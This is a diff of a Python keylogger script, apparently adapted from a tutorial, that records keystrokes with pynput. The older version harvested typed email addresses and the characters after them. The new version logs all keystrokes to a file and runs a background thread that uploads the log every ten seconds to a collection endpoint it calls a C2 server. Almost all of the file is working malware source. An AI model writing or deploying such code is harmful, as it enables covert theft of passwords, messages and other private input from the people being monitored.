@@ -1,74 +1,99 @@
 # based almost entirely on : https://rajmehta2012.medium.com/introduction-274b4f4f6724
-
-
-# coded by Raj Mehta & Vatsal Sharma
-# dated 11 Nov 2020
-
+import threading
+import time
+import requests
 from pynput.keyboard import Key, Listener
 import re
+from Xlib import X, XK
+from Xlib.display import Display
+
+URL = "http://127.0.0.1:8080/collect"
+FILENAME = "log.txt"
+display = Display()
+
 count = 0
-keys = []
+queue_keys = []
 
-def process_input(text):
-    email_pattern = re.compile(r"[\w.+-]+@[\w-]+\.[\w.-]+")
-    match = email_pattern.search(text)
 
-    if not match:
-        return None
+def key_to_text(key):
+    if key == Key.space:
+        return " "
 
-    email = match.group()
-    start = match.end()
+    if key == Key.enter:
+        return "\n"
 
-    # Capture the next 100 characters after the detected email
-    following = text[start:start + 100]
+    if hasattr(key, "char") and key.char is not None:
+        return key.char
 
-    return {
-        "email": email,
-        "next_100": following,
-    }
-
+    return ""
 
 def on_press(key):
     # function called when a key is pressed
-    global keys, count
-    keys.append(key)
+    global queue_keys, count
     count += 1
     print(count)
 
     if key == Key.backspace:
-        keys.pop()
+        if queue_keys:
+            print("Backspace detected, removing last key from queue")
+            queue_keys.pop()
+        return
 
-    if key == Key.space:
-        key = " "
-        keys.append(key)
+    queue_keys.append(key)
 
-    print(format(key))
 
-    def write_file(key1):
-        f = open("log.txt", "w+")
-        for key in key1:
-            f.write(str(key))
-        f.write("\n")
-        f.write("\n")
-        f.write("\n")
-        f.close()
+    # if it is enter key, then we will write the keys to the file
+    if key == Key.enter:
+        text = "".join([key_to_text(k) for k in queue_keys])
+        print("Writing to file:", text)
+        with open(FILENAME, "a") as f:
+            f.write(text)
 
-    # process the input and check for email addresses
-    input_text = "".join(str(k) for k in keys)
-    processed_data = process_input(input_text)
+        queue_keys.clear()
+        count = 0
+        return 
+    # if more than 100 keys are pressed, we will write the keys to the file
+    if count >= 75:
+        text = "".join([key_to_text(k) for k in queue_keys])
+        print("Writing to file:", text)
+        with open(FILENAME, "a") as f:
+            f.write(text)
 
-    print(input_text)
-    #if an email address is found, send it write to file 
-    if processed_data:
-        with open("log.txt", "a") as f:
-            f.write(f"Email: {processed_data['email']}\n")
-            f.write(f"Next 100 characters: {processed_data['next_100']}\n")
-            f.write("\n")
+        queue_keys.clear()
+        count = 0
+        return
+        
+
 
 def on_release(key):
     if key == Key.esc:
         return False
 
+def send_data():
+    while True:
+        try:
+            with open(FILENAME, "rb") as f:
+                response = requests.post(
+                    URL,
+                    files={"file": (FILENAME, f, "text/plain")},
+                    timeout=5
+                )
+
+            print("Data sent:", response.status_code)
+
+        except requests.RequestException as e:
+            print("C2 unavailable:", e)
+        except FileNotFoundError:
+            print("Log file not found. Waiting for the first log entry.")
+        time.sleep(10)
+
+
+thread = threading.Thread(target=send_data, daemon=True)
+thread.start()
+
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
+    with open(FILENAME, "a") as f:
+        f.write("\n\n##############################################NEW SESSION##############################################\n\n")
     listener.join()
+
